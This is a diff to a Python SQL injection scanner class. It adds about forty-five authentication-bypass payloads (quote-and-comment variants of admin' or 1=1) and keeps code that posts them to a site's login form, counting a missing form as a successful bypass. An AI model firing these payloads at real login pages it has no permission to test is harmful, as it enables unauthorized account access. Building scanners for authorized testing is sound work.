@@ -35,10 +35,53 @@ class SQLInjection(object):
         # http://stackoverflow.com/questions/9626535/get-domain-name-from-url
         # self.domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url))
 
+        # http://www.hacoder.com/2015/10/sql-injection-authentication-bypass-cheat-sheet/
         self.input_data = [
             ['admin\'--', '123456789'],
             ['\' or 1=1', '123456789'],
-            ['admin', '\'or \'1\'=\'1']
+            [' or 1=1', ''],
+            ['or 1=1--', ''],
+            ['or 1=1#', ''],
+            ['or 1=1/*', ''],
+            ['admin\' #', ''],
+            ['admin\'/*', ''],
+            ['admin\' or \'1\'=\'1', ''],
+            ['admin\' or \'1\'=\'1\'--', ''],
+            ['admin\' or \'1\'=\'1\'#', ''],
+            ['admin\' or \'1\'=\'1\'/*', ''],
+            ['admin\'or 1=1 or \'\'=\'', ''],
+            ['admin\' or 1=1', ''],
+            ['admin\' or 1=1--', ''],
+            ['admin\' or 1=1#', ''],
+            ['admin\' or 1=1/*', ''],
+            ['admin\') or (\'1\'=\'1', ''],
+            ['admin\') or (\'1\'=\'1\'--', ''],
+            ['admin\') or (\'1\'=\'1\'#', ''],
+            ['admin\') or (\'1\'=\'1\'/*', ''],
+            ['admin\') or \'1\'=\'1', ''],
+            ['admin\') or \'1\'=\'1\'--', ''],
+            ['admin\') or \'1\'=\'1\'#', ''],
+            ['admin\') or \'1\'=\'1\'/*', ''],
+            ['admin" --', ''],
+            ['admin" #', ''],
+            ['admin"/*', ''],
+            ['admin" or "1"="1', ''],
+            ['admin" or "1"="1"--', ''],
+            ['admin" or "1"="1"#', ''],
+            ['admin" or "1"="1"/*', ''],
+            ['admin"or 1=1 or ""="', ''],
+            ['admin" or 1=1', ''],
+            ['admin" or 1=1--', ''],
+            ['admin" or 1=1#', ''],
+            ['admin" or 1=1/*', ''],
+            ['admin") or ("1"="1', ''],
+            ['admin") or ("1"="1"--', ''],
+            ['admin") or ("1"="1"#', ''],
+            ['admin") or ("1"="1"/*', ''],
+            ['admin") or "1"="1', ''],
+            ['admin") or "1"="1"--', ''],
+            ['admin") or "1"="1"#', ''],
+            ['admin") or "1"="1"/*', '']
         ]
 
         self.blind_param_data = [
@@ -90,7 +133,7 @@ class SQLInjection(object):
                     }
                     r = requests.post(action, data=urllib.parse.urlencode(d))
                     response = r.text
-                    if action not in response:  # If the logging form doesn't exists, the attempt is a success.
+                    if action not in response:  # If the logging form doesn't exist, the attempt is a success.
                         self.__save_results(url, 1)
                         return True  # It is not necessary to keep going, we found an sql injection.
         return False
